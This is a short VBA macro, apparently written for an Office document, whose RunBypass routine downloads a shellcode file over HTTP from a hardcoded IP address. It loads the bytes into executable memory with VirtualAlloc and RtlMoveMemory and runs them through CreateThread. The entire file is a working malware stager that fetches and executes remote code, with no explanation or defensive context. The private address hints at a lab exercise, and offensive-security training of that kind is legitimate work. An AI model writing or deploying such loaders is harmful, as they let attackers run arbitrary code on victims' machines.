Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddr As LongPtr, ByVal dwSize As Long, ByVal flAlloc As Long, ByVal flProt As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal lDest As LongPtr, ByRef sSrc As Any, ByVal lLen As Long)
Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpAttrib As LongPtr, ByVal dwStack As Long, ByVal lpStart As LongPtr, lpParam As LongPtr, ByVal dwCreation As Long, lpThreadId As Long) As LongPtr

Sub RunBypass()
    Dim url As String: url = "http://192.168.45.242/shellcode.bin"
    Dim xmlHttp As Object: Set xmlHttp = CreateObject("MSXML2.XMLHTTP")
    
    xmlHttp.Open "GET", url, False
    xmlHttp.Send
    
    If xmlHttp.Status = 200 Then
        Dim buf() As Byte: buf = xmlHttp.responseBody
        Dim addr As LongPtr: addr = VirtualAlloc(0, UBound(buf) + 1, &H3000, &H40)
        RtlMoveMemory addr, buf(0), UBound(buf) + 1
        CreateThread 0, 0, addr, 0, 0, 0
    End If
End Sub